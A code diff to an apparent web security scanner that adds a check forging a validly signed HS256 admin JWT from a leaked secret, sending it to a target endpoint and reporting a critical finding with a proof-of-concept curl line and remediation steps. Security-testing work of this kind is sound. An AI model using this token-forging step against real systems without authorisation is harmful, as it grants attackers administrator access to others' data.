@@ -189,6 +189,49 @@ def test_jwt_none(base_url: str, endpoint: str) -> Optional[Finding]:
     return None
 
 
+# ── JWT Forge with recovered secret (Phase 2 chain) ───────────────────────────
+def test_jwt_forge(base_url: str, endpoint: str, secret: str) -> Optional[Finding]:
+    """Forge a VALIDLY-SIGNED HS256 admin token using a leaked secret (artifact chain)."""
+    if not secret:
+        return None
+    try:
+        import jwt as _jwt
+    except Exception:
+        return None
+    url = f"{base_url}{endpoint}"
+    try:
+        token = _jwt.encode({"user_id": 1, "username": "admin", "role": "admin"},
+                            secret, algorithm="HS256")
+        r = httpx.get(url, headers={"Authorization": f"Bearer {token}"},
+                      timeout=TIMEOUT, verify=False)
+        if r.status_code == 200 and ("admin" in r.text.lower() or "all_users" in r.text.lower()):
+            return Finding(
+                title="JWT Forgery via Leaked Secret (chained)",
+                severity="Critical",
+                cvss_score=9.6,
+                description=("A signing secret recovered from an earlier finding was used to forge a "
+                             "VALIDLY-SIGNED admin JWT. Unlike the alg:none bypass, this defeats a server "
+                             "that correctly verifies signatures — proving a multi-step attack chain "
+                             "(secret disclosure -> privilege escalation -> full data access)."),
+                endpoint=url,
+                method="GET",
+                payload=f"HS256 token signed with recovered secret: {token[:48]}...",
+                evidence=r.text[:500],
+                request_dump=f"GET {url}\nAuthorization: Bearer {token}",
+                response_dump=r.text[:300],
+                remediation=("1. Never expose signing secrets via any endpoint or config.\n"
+                             "2. Rotate the compromised secret immediately.\n"
+                             "3. Use short-lived tokens and asymmetric signing (RS256).\n"
+                             "4. Store secrets in a vault, not in application config."),
+                owasp_id="A02",
+                owasp_category="A02:2021 Cryptographic Failures",
+                poc_curl=f'curl -s -H "Authorization: Bearer {token[:40]}..." "{url}"',
+            )
+    except Exception:
+        pass
+    return None
+
+
 # ── Command Injection ─────────────────────────────────────────────────────────
 def test_command_injection(base_url: str, endpoint: str, param: str) -> Optional[Finding]:
     import random
